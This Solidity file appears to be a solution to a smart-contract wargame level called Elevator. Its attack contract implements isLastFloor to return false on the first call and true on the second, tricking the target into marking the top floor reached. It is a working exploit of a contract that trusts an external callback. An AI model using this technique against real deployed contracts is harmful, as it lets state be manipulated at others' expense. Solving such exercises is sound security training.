// SPDX-License-Identifier: MIT

import "./Elevator.sol";

pragma solidity ^0.8.0;

contract ElevatorAttack is Building {
    Elevator public immutable elevator;
    address public owner;
    uint public call;

    constructor(address _elevatorAddress) {
        elevator = Elevator(_elevatorAddress);
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner, "Only the owner can call this function.");
        _;
    }

    function isLastFloor(uint256) override external returns (bool) {
        call++;
        return call > 1; // Elevator will only reach the top floor on the second call
    }

    function attack() external onlyOwner {
        elevator.goTo(1);
        require(elevator.top(), "Elevator did not reach the top floor.");
    }
}
